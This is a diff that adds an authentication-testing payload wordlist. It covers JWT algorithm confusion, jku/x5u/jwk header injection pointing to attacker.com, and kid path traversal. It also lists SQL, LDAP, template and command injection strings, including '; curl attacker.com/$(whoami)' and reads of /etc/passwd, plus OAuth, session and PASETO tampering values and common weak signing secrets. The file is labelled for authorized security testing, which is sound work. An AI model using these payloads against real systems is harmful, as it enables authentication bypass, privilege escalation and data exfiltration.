@@ -1,0 +1,464 @@
+# JWT/Token Manipulation Payloads
+# For authorized security testing only
+# Comprehensive collection for auth-agent token testing module
+
+# ============================================================================
+# JWT ALGORITHM CONFUSION PAYLOADS
+# ============================================================================
+
+# Algorithm Values to Test
+none
+None
+NONE
+nOnE
+noNe
+NonE
+
+# Algorithm Substitution (RS256 -> HS256)
+HS256
+HS384
+HS512
+RS256
+RS384
+RS512
+ES256
+ES384
+ES512
+PS256
+PS384
+PS512
+
+# Algorithm Downgrade Chain
+# Try replacing RS256 with each:
+HS256
+HS384
+HS512
+none
+None
+NONE
+
+# ============================================================================
+# JWT HEADER MANIPULATION
+# ============================================================================
+
+# JKU (JWK Set URL) Injection
+{"jku": "https://attacker.com/.well-known/jwks.json"}
+{"jku": "https://attacker.com/jwks"}
+{"jku": "https://target.com@attacker.com/jwks.json"}
+{"jku": "https://target.com/.well-known/jwks.json/../../../attacker.com/jwks.json"}
+{"jku": "https://target.com%40attacker.com/.well-known/jwks.json"}
+{"jku": "https://attacker.com#.target.com/.well-known/jwks.json"}
+{"jku": "https://target.com/.well-known/jwks.json?redirect=https://attacker.com/jwks.json"}
+{"jku": "https://attacker.com/jwks.json?.target.com"}
+{"jku": "https://target.com\\@attacker.com/jwks.json"}
+{"jku": "https://target.com:443@attacker.com/jwks.json"}
+
+# X5U (X.509 Certificate URL) Injection
+{"x5u": "https://attacker.com/cert.pem"}
+{"x5u": "https://attacker.com/cert.crt"}
+{"x5u": "https://target.com@attacker.com/cert.pem"}
+{"x5u": "https://target.com/.well-known/x509cert/../../../attacker.com/cert.pem"}
+{"x5u": "https://attacker.com/cert.pem?.target.com"}
+
+# JWK (Embedded JSON Web Key) Injection
+# Embed attacker's public key directly in the header
+{"jwk": {"kty": "RSA", "n": "ATTACKER_MODULUS", "e": "AQAB"}}
+{"jwk": {"kty": "EC", "crv": "P-256", "x": "ATTACKER_X", "y": "ATTACKER_Y"}}
+{"jwk": {"kty": "oct", "k": "ATTACKER_SYMMETRIC_KEY"}}
+
+# KID (Key ID) Injection Payloads
+# Path Traversal
+../../../../../../dev/null
+../../../../../../../dev/null
+../../../../../../etc/hostname
+/dev/null
+/proc/self/environ
+
+# KID SQL Injection
+' UNION SELECT 'ATTACKER_KEY' --
+' OR '1'='1
+" UNION SELECT "ATTACKER_KEY" --
+1' UNION SELECT x'41414141' --
+' UNION ALL SELECT 'HMAC_KEY_HERE'-- -
+
+# KID Command Injection
+| cat /etc/passwd
+; cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; curl attacker.com/$(whoami)
+
+# KID LDAP Injection
+*)(uid=*))(|(uid=*
+admin)(|(password=*
+
+# KID Template Injection
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+
+# KID with Null Byte
+key_id%00.pem
+key_id\x00.pem
+../../etc/passwd%00
+
+# ============================================================================
+# JWT PAYLOAD CLAIM MANIPULATION
+# ============================================================================
+
+# Subject (sub) Claims
+admin
+root
+0
+1
+-1
+null
+system
+service-account
+superadmin
+
+# Issuer (iss) Claims
+https://attacker.com
+https://localhost
+http://localhost:8080
+https://accounts.google.com
+https://login.microsoftonline.com/common
+null
+*
+
+# Audience (aud) Claims
+*
+admin-api
+internal-api
+management-api
+https://attacker.com
+["target-api","attacker-api"]
+
+# Role/Permission Claims
+{"role": "admin"}
+{"role": "superadmin"}
+{"roles": ["admin", "user"]}
+{"permissions": ["*"]}
+{"groups": ["administrators"]}
+{"scope": "admin:full"}
+{"is_admin": true}
+{"admin": true}
+{"privilege_level": 9999}
+{"access_level": "admin"}
+
+# Expiration Manipulation
+# Set exp far in future (year 2099)
+4102444800
+# Set exp to 0
+0
+# Remove exp claim entirely (omit from payload)
+# Set exp to negative
+-1
+# Set exp as string
+"never"
+"infinity"
+
+# Not Before (nbf) Manipulation
+0
+-1
+1
+946684800
+
+# Issued At (iat) Manipulation
+0
+-1
+4102444800
+946684800
+
+# JWT ID (jti) Manipulation
+00000000-0000-0000-0000-000000000000
+1
+null
+""
+ffffffff-ffff-ffff-ffff-ffffffffffff
+
+# ============================================================================
+# JWT SIGNATURE MANIPULATION
+# ============================================================================
+
+# Empty Signature (remove signature, keep trailing dot)
+# header.payload.
+
+# Null Signature
+# header.payload.AA==
+
+# Signature Stripping (remove signature entirely)
+# header.payload
+
+# Signature with Different Key
+# Re-sign with attacker-generated key
+
+# Cross-Service Signature Confusion
+# Use token signed by Service A against Service B
+
+# ============================================================================
+# JWT ENCODING TRICKS
+# ============================================================================
+
+# Base64URL Padding Variations
+# Add = padding
+# Add == padding
+# Remove padding
+# Use standard base64 instead of base64url
+
+# Unicode Tricks in Claims
+{"sub": "admin\u0000"}
+{"sub": "admin\u200b"}
+{"sub": "\u0061dmin"}
+{"sub": "admin\u00ad"}
+
+# JSON Parsing Tricks
+{"sub": "admin", "sub": "user"}
+{"sub": "user", "sub": "admin"}
+{"role": "admin"/* comment */}
+
+# ============================================================================
+# OAUTH TOKEN MANIPULATION
+# ============================================================================
+
+# Access Token Format Testing
+# Try using refresh token as access token
+# Try using ID token as access token
+# Try using authorization code as access token
+
+# Token Type Confusion
+{"token_type": "bearer"}
+{"token_type": "Bearer"}
+{"token_type": "BEARER"}
+{"token_type": "mac"}
+{"token_type": "basic"}
+{"token_type": "dpop"}
+
+# Grant Type Manipulation
+authorization_code
+client_credentials
+password
+refresh_token
+urn:ietf:params:oauth:grant-type:device_code
+urn:ietf:params:oauth:grant-type:token-exchange
+urn:ietf:params:oauth:grant-type:jwt-bearer
+
+# Token Exchange (RFC 8693) Payloads
+{"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange", "subject_token": "VICTIM_TOKEN", "subject_token_type": "urn:ietf:params:oauth:token-type:access_token", "requested_token_type": "urn:ietf:params:oauth:token-type:access_token"}
+{"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange", "subject_token": "VICTIM_TOKEN", "subject_token_type": "urn:ietf:params:oauth:token-type:id_token"}
+{"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange", "actor_token": "ATTACKER_TOKEN", "subject_token": "VICTIM_TOKEN"}
+
+# ============================================================================
+# REFRESH TOKEN ATTACKS
+# ============================================================================
+
+# Refresh Token Reuse (after rotation)
+# Send old refresh token after new one issued
+# Test if old refresh token still works
+# Test if token family is revoked on reuse
+
+# Refresh Token Scope Escalation
+{"scope": "admin read write"}
+{"scope": "openid profile email admin"}
+{"scope": "*"}
+
+# Refresh Token Grant Type Confusion
+{"grant_type": "refresh_token", "refresh_token": "ACCESS_TOKEN_HERE"}
+{"grant_type": "refresh_token", "refresh_token": "AUTH_CODE_HERE"}
+
+# ============================================================================
+# SESSION TOKEN MANIPULATION
+# ============================================================================
+
+# Session ID Prediction
+# Sequential: increment/decrement by 1
+00000001
+00000002
+00000003
+99999998
+99999999
+
+# Session Fixation Values
+attacker_controlled_session_id
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+00000000000000000000000000000000
+deadbeefdeadbeefdeadbeefdeadbeef
+
+# Session Token Format Attacks
+# Hex encoded
+4141414141414141
+# Base64 encoded
+QUFBQUFBQUFBQUE=
+# URL encoded
+%41%41%41%41%41%41%41%41
+
+# ============================================================================
+# PASETO TOKEN MANIPULATION
+# ============================================================================
+
+# Version Downgrade
+v1.local.
+v1.public.
+v2.local.
+v2.public.
+v3.local.
+v3.public.
+v4.local.
+v4.public.
+
+# PASETO Footer Manipulation
+{"kid": "attacker-key"}
+{"wpk": "attacker-wrapped-key"}
+
+# PASETO Claim Manipulation (same as JWT claims but in PASETO format)
+{"sub": "admin", "exp": "2099-12-31T23:59:59Z", "iat": "2024-01-01T00:00:00Z"}
+
+# ============================================================================
+# DPoP (Demonstration of Proof-of-Possession) PAYLOADS
+# ============================================================================
+
+# DPoP Header Manipulation
+{"typ": "dpop+jwt", "alg": "none"}
+{"typ": "dpop+jwt", "alg": "HS256"}
+{"typ": "dpop+jwt", "jwk": {"kty": "RSA", "n": "ATTACKER_KEY"}}
+
+# DPoP Claim Manipulation
+{"htm": "GET", "htu": "https://attacker.com/api", "iat": 1700000000}
+{"htm": "POST", "htu": "https://target.com/api", "iat": 4102444800}
+{"htm": "*", "htu": "*"}
+
+# DPoP Proof Replay
+# Capture and replay DPoP proof with different access token
+# Test nonce enforcement
+# Test without DPoP header on protected endpoint
+
+# DPoP Token Binding Bypass
+# Use DPoP token without DPoP proof
+# Use DPoP token with different key pair
+# Use Bearer scheme with DPoP-bound token
+
+# ============================================================================
+# OPAQUE TOKEN MANIPULATION
+# ============================================================================
+
+# Token Length Manipulation
+A
+AA
+AAAA
+AAAAAAAA
+AAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# Bit Flipping (modify single character)
+# Take valid token, change first char
+# Take valid token, change last char
+# Take valid token, change middle char
+
+# Token Truncation
+# Remove last 1 character
+# Remove last 2 characters
+# Remove last 4 characters
+# Remove last 8 characters
+# Keep only first half
+
+# ============================================================================
+# API TOKEN MANIPULATION
+# ============================================================================
+
+# Bearer Token Variations
+Bearer TOKEN
+bearer TOKEN
+BEARER TOKEN
+Bearer  TOKEN
+Bearer\tTOKEN
+Bearer\nTOKEN
+
+# Token Prefix Manipulation
+Token TOKEN
+Basic TOKEN_AS_BASE64
+Digest TOKEN
+MAC TOKEN
+DPoP TOKEN
+SSPI TOKEN
+Negotiate TOKEN
+
+# Multiple Authorization Headers
+# Send two Authorization headers with different tokens
+# Send Authorization in header AND query parameter
+# Send token in cookie AND Authorization header
+
+# ============================================================================
+# COMMON WEAK SECRETS FOR SIGNING
+# ============================================================================
+
+secret
+password
+123456
+key
+private
+hmac-secret
+jwt-secret
+signing-key
+default
+test
+development
+changeme
+admin
+null
+undefined
+empty
+your-256-bit-secret
+your-384-bit-secret
+your-512-bit-secret
+HS256-secret
+auth-secret
+app-secret
+my-secret
+super-secret
+jwt_secret_key
+token-secret
+api-secret
+SECRET_KEY
+s3cr3t
+p@ssw0rd
+qwerty
+letmein
+
+# ============================================================================
+# HASH/ENCODING BYPASS TOKENS
+# ============================================================================
+
+# Empty/Null Values
+(empty string)
+null
+NULL
+nil
+undefined
+0
+false
+NaN
+Infinity
+-Infinity
+
+# Special Characters
+\x00
+\n
+\r
+\r\n
+\t
+%00
+%0a
+%0d
+
+# Type Juggling (for PHP backends)
+0
+true
+false
+[]
+{}
+"0"
+"true"
+"false"
+"null"
